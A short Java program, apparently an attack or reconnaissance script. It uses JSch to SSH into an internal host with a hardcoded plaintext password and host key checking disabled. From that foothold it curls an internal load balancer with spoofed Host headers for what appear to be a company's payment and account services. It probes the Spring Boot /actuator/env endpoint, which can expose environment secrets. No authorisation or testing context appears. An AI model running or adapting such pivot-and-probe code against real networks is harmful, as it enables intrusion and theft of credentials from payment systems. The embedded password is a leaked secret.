import com.jcraft.jsch.*;
import java.io.*;
class SSHY {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("echo ---LB-PAYMENT---;curl -sk -H 'Host: payment.accurate.id' https://10.14.16.50/ 2>/dev/null | head -10;echo ---LB-ACCOUNT---;curl -sk -H 'Host: account.accurate.id' https://10.14.16.50/ 2>/dev/null | head -10;echo ---LB-ACTUATOR---;curl -sk -H 'Host: payment.accurate.id' https://10.14.16.50/actuator/env 2>/dev/null | head -50;echo ---LB-HEALTH---;curl -sk -H 'Host: payment.accurate.id' https://10.14.16.50/actuator/health 2>/dev/null | head -10;echo ---LB-80---;curl -s -H 'Host: payment.accurate.id' -L http://10.14.16.50/ 2>/dev/null | head -10");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
